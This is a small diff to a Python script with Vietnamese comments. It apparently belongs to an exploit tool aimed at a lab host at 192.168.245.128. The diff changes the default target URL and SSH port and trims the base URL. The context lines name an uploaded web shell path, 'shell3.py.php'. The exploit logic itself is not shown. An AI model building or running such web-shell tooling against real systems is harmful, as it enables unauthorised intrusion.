@@ -30,8 +30,8 @@ if hasattr(sys.stdout, "reconfigure"):
 # ============================================================
 # CẤU HÌNH
 # ============================================================
-DEFAULT_BASE        = "http://localhost:3000"
-DEFAULT_SSH_PORT    = 2022
+DEFAULT_BASE        = "http://192.168.245.128:3000"
+DEFAULT_SSH_PORT    = 22
 
 REMOTE_SHELL_MYSQL  = "/app/uploads/shell3.py.php"
 SHELL_URL_PATH      = "/uploads/shell3.py.php"
@@ -289,6 +289,7 @@ def main():
     parser.add_argument("--ssh-port", type=int, default=DEFAULT_SSH_PORT)
     parser.add_argument("--no-ssh", action="store_true")
     args = parser.parse_args()
+    args.base = args.base.rstrip('/')
 
     ssh_host = args.ssh_host or urlparse(args.base).hostname or "localhost"
 
